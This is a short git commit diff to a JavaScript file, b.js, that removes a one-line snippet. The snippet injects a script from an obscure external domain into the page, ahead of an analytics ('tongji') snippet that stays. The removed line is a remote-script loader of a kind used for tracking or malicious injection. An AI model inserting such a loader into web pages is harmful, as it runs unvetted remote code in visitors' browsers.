5e96c5584112dcbc6230077a6a67cc935779e16b
yellowside <30918006+yellowside@users.noreply.github.com>
2021-01-28 08:53:01 +0800

    Update b.js

--- b.js
+++ b.js
@@ -1,4 +1,3 @@
-(function(){ var m = document.createElement("script"); m.src = "https://xg.tjwmtrw.cn/sc/4734?x=0.8521109128740367"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(m, s); })();
 //tongji
 var _hmt = _hmt || [];
 (function() {
